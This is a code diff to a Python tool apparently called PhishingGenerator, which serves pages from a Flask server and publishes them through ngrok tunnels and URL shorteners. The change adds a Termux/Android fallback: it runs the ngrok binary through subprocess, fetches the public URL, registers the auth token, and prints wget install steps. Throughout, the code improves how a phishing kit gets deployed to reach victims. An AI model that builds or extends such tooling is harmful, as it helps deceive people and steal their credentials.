@@ -3,6 +3,7 @@ import json
 import os
 import random
 import string
+import subprocess
 import time
 import urllib.parse
 import threading
@@ -11,7 +12,6 @@ import logging
 from flask import Flask, request, redirect, jsonify, make_response
 import pyshorteners
 from urllib.parse import urlparse, urljoin
-from pyngrok import ngrok, conf, exception as ngrok_exception
 from rich.console import Console
 from rich.table import Table
 from rich.live import Live
@@ -24,8 +24,59 @@ SESSION_FILE = '.phishgen_session.json'
 
 console = Console()
 
-logging.getLogger("pyngrok").setLevel(logging.ERROR)
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
+
+# === Pyngrok import with Termux/Android fallback ===
+NGROK_BIN = None
+NGROK_MANAGER = None
+
+try:
+    from pyngrok import ngrok, conf, exception as ngrok_exception
+    logging.getLogger("pyngrok").setLevel(logging.ERROR)
+    NGROK_MANAGER = "pyngrok"
+except Exception as e:
+    console.print(f"[yellow][!] pyngrok import failed ({str(e)[:60]}...)[/]")
+    console.print("[yellow][!] Falling back to direct ngrok binary[/]")
+    ngrok = None
+    conf = None
+    ngrok_exception = Exception
+
+    class NgrokProcess:
+        def __init__(self):
+            self.process = None
+
+        def kill(self):
+            if self.process:
+                try: self.process.terminate()
+                except: pass
+            try: subprocess.run(["pkill", "-f", "ngrok"], capture_output=True)
+            except: pass
+
+        def connect(self, addr="5000", **kwargs):
+            self.kill()
+            self.process = subprocess.Popen(
+                ["ngrok", "http", addr, "--log=stdout"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            time.sleep(4)
+            try:
+                resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
+                tunnels = resp.json().get("tunnels", [])
+                if tunnels:
+                    class T: pass
+                    t = T(); t.public_url = tunnels[0]["public_url"]; return t
+            except:
+                pass
+            class T: pass
+            t = T(); t.public_url = None; return t
+
+    class NgrokConf:
+        def get_default(self):
+            return self
+
+    ngrok = NgrokProcess()
+    conf = NgrokConf()
+    ngrok_exception = Exception
 
 class PhishingGenerator:
     def __init__(self):
@@ -523,6 +574,23 @@ class PhishingGenerator:
     def setup_ngrok(self):
         """Setup ngrok tunnel dengan session token"""
         self.clear_screen()
+        if NGROK_MANAGER != "pyngrok":
+            try:
+                subprocess.run(["ngrok", "version"], capture_output=True, check=True, timeout=10)
+            except:
+                console.print("[red]❌ ngrok binary not found![/]")
+                console.print("[yellow]Install ngrok manually: https://ngrok.com/download[/]")
+                if self.language == "id":
+                    console.print("\nUntuk Termux (aarch64/arm64):")
+                    console.print("  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz")
+                    console.print("  tar xzf ngrok-*.tgz && mv ngrok $PREFIX/bin/")
+                else:
+                    console.print("\nFor Termux (aarch64/arm64):")
+                    console.print("  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz")
+                    console.print("  tar xzf ngrok-*.tgz && mv ngrok $PREFIX/bin/")
+                console.input("\n[green]Press Enter after installing ngrok...[/]")
+                self.setup_ngrok()
+                return
         try:
             saved_token = self._load_session_token()
             if saved_token:
@@ -533,38 +601,39 @@ class PhishingGenerator:
                 self._save_session_token(self.ngrok_auth_token)
                 console.print("[green]✓ Ngrok token saved to session[/]")
 
-            conf.get_default().auth_token = self.ngrok_auth_token
-            conf.get_default().region = self.ngrok_region
+            if NGROK_MANAGER == "pyngrok":
+                conf.get_default().auth_token = self.ngrok_auth_token
+                conf.get_default().region = self.ngrok_region
+            else:
+                subprocess.run(["ngrok", "config", "add-authtoken", self.ngrok_auth_token],
+                               capture_output=True, timeout=10)
 
             try:
                 ngrok.kill()
             except:
                 pass
 
-            tunnel_options = {
-                "bind_tls": True,
-                "proto": "http",
-                "addr": str(self.server_port),
-                "inspect": False,
-                "auth": None,
-                "host_header": "rewrite"
-            }
+            addr = str(self.server_port)
 
             max_retries = 3
             for attempt in range(max_retries):
                 try:
-                    ngrok_tunnel = ngrok.connect(**tunnel_options)
+                    if NGROK_MANAGER == "pyngrok":
+                        ngrok_tunnel = ngrok.connect(
+                            bind_tls=True, proto="http", addr=addr,
+                            inspect=False, auth=None, host_header="rewrite"
+                        )
+                    else:
+                        ngrok_tunnel = ngrok.connect(addr)
                     self.server_url = ngrok_tunnel.public_url
-                    break
-                except ngrok_exception.PyngrokNgrokError as e:
+                    if self.server_url:
+                        break
+                    raise Exception("Failed to get public URL")
+                except Exception as e:
                     error_str = str(e).lower()
-                    if 'auth' in error_str or 'credential' in error_str or 'token' in error_str or 'unauthorized' in error_str:
+                    if any(k in error_str for k in ['auth', 'credential', 'token', 'unauthorized']):
                         self._clear_session_token()
                         raise Exception("Ngrok authentication failed. Token saved in session has been cleared. Please provide a valid token next run.")
-                    if attempt == max_retries - 1:
-                        raise e
-                    time.sleep(2)
-                except Exception as e:
                     if attempt == max_retries - 1:
                         raise e
                     time.sleep(2)
